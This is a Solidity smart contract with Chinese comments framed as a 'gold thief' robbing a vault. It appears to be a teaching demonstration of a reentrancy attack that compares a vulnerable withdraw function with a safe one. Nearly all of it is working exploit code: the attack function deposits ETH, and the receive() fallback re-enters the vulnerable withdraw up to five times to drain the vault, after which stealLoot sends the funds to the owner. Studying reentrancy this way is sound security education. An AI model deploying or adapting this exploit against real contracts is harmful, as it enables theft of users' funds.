// SPDX-License-Identifier: MIT
// 许可证声明：允许自由使用、修改这个合约
pragma solidity ^0.8.20;
// 指定Solidity编译器版本：0.8.20及以上

interface IVault {
    /// @dev 往金库存ETH（小偷假装成客户用）
    function deposit() external payable;
    
    /// @dev 金库的危险取钱口（核心打劫目标）
    function vulnerableWithdraw() external;
    
    /// @dev 金库的安全取钱口（尝试打劫但必败）
    function safeWithdraw() external;
}

contract GoldThief {
    // ============ 核心变量（小偷机器人基础设置） ============
    IVault public targetVault;   // 要打劫的金库（按"打劫手册"匹配）
    address public owner;        // 小偷机器人的主人（只有主人能指挥）
    uint public attackCount;     // 已打劫次数（抢一次记一次）
    bool public attackingSafe;   // 打劫模式：false=危险口，true=安全口


    constructor(address _vaultAddress) {
        targetVault = IVault(_vaultAddress); // 记录要打劫的金库
        owner = msg.sender;                  // 记录机器人主人
    }


    function attackVulnerable() external payable {
        // 权限检查：只有主人能下令打劫
        require(msg.sender == owner, "Only owner");
        // 入场费检查：至少给1 ETH才能假装存钱
        require(msg.value >= 1 ether, "Need at least 1 ETH to attack");

        attackingSafe = false; // 切换到"打劫危险口"模式
        attackCount = 0;       // 重置打劫次数（从0开始）

        // 第一步：假装成普通客户，存ETH进金库（获得取钱权限）
        targetVault.deposit{value: msg.value}();
        // 第二步：调用危险取钱口，触发第一次打劫
        targetVault.vulnerableWithdraw();
    }

    function attackSafe() external payable {
        // 权限检查：只有主人能操作
        require(msg.sender == owner, "Only owner");
        // 入场费检查：至少给1 ETH
        require(msg.value >= 1 ether, "Need at least 1 ETH");

        attackingSafe = true; // 切换到"打劫安全口"模式
        attackCount = 0;      // 重置打劫次数

        // 假装存钱，获得取钱权限
        targetVault.deposit{value: msg.value}();
        // 调用安全取钱口（只会取到自己存的钱）
        targetVault.safeWithdraw();
    }


    receive() external payable {
        attackCount++; // 打劫次数+1

        // 情况1：打劫危险口，且金库有钱、没抢够5次 → 继续抢
        if (!attackingSafe && address(targetVault).balance >= 1 ether && attackCount < 5) {
            targetVault.vulnerableWithdraw(); // 重复调用危险取钱口
        }

        // 情况2：打劫安全口 → 尝试再抢，但会失败（账本已清零）
        if (attackingSafe) {
            targetVault.safeWithdraw(); // 金库会提示"没钱可取"
        }
    }


    function stealLoot() external {
        require(msg.sender == owner, "Only owner"); // 仅限主人操作
        // 把机器人所有ETH转给主人
        (bool success, ) = payable(owner).call{value: address(this).balance}("");
        require(success, "Transfer failed"); // 转钱失败则提示
    }
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}